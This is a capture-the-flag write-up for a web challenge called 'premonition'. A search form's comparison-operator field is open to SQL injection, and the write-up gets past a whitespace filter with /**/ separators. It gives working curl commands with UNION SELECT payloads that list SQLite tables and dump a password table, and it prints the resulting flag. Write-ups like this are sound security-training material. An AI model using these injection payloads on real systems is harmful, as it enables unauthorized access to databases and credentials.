## premonition - Web 140 Problem

### Description

```
There's been some weird occurrences going on at our school. Teacher's answer questions as though they knew the answer in advance, test results being handed out before the test, and now a weird web form giving info about us. Can you find out what weird information is on it?

Find the page at http://premonition-p8l05mpz.9447.plumbing:9447
```

### Solution

The web page has a form to search through a database of test scores. You control which field is searched, what it is searched for, and the comparison operator. The comparision operator was an obvious first choice for a SQL injection attack.

If you test the comparision operator with invalid operators, there is an error message indicating that the user running the script is *sqliteadmin*. Additionally, further testing showed that all whitespace characters are removed from the provided comparison operator. The resulting queries to list table names and structures:

```
$ curl -d 'score=92' -d 'ineq=is/**/null/**/union/**/select/**/name,sql,3,4/**/from/**/sqlite_master/**/where/**/' http://premonition-p8l05mpz.9447.plumbing:9447/score
[["s3ekr17_passwords", "CREATE TABLE s3ekr17_passwords(\n\tuserid real,\n\tpassword text\n)", 3, 4], ["students", "CREATE TABLE students(\n\tuserid real,\n\tfirstname text,\n\tlastname text,\n\tscore real,\n\tteacher real,\n\tclass text,\n\tdate_birth date,\n\tdate_death date\n)", 3, 4]]
```

Now we can list all of the records in the *s3ekr17_passwords* table:

```
curl -d 'score=92' -d 'ineq=is/**/null/**/union/**/select/**/userid,password,3,4/**/from/**/s3ekr17_passwords/**/where/**/' http://premonition-p8l05mpz.9447.plumbing:9447/score
[[0.0, "9", 3, 4], [1.0, "4", 3, 4], [2.0, "4", 3, 4], [3.0, "7", 3, 4], [4.0, "{", 3, 4], [5.0, "u", 3, 4], [6.0, "S", 3, 4], [7.0, "e", 3, 4], [8.0, "r", 3, 4], [9.0, "A", 3, 4], [10.0, "g", 3, 4], [11.0, "e", 3, 4], [12.0, "n", 3, 4], [13.0, "T", 3, 4], [14.0, "s", 3, 4], [15.0, "_", 3, 4], [16.0, "a", 3, 4], [17.0, "N", 3, 4], [18.0, "d", 3, 4], [19.0, "_", 3, 4], [20.0, "s", 3, 4], [21.0, "p", 3, 4], [22.0, "a", 3, 4], [23.0, "C", 3, 4], [24.0, "e", 3, 4], [25.0, "s", 3, 4], [26.0, "_", 3, 4], [27.0, "a", 3, 4], [28.0, "R", 3, 4], [29.0, "e", 3, 4], [30.0, "_", 3, 4], [31.0, "p", 3, 4], [32.0, "e", 3, 4], [33.0, "a", 3, 4], [34.0, "s", 3, 4], [35.0, "A", 3, 4], [36.0, "n", 3, 4], [37.0, "t", 3, 4], [38.0, "_", 3, 4], [39.0, "R", 3, 4], [40.0, "a", 3, 4], [41.0, "c", 3, 4], [42.0, "E", 3, 4], [43.0, "s", 3, 4], [44.0, "}", 3, 4]]
```

After concatenating all of the password fields, you get the flag:

```
9447{uSerAgenTs_aNd_spaCes_aRe_peasAnt_RacEs}
```
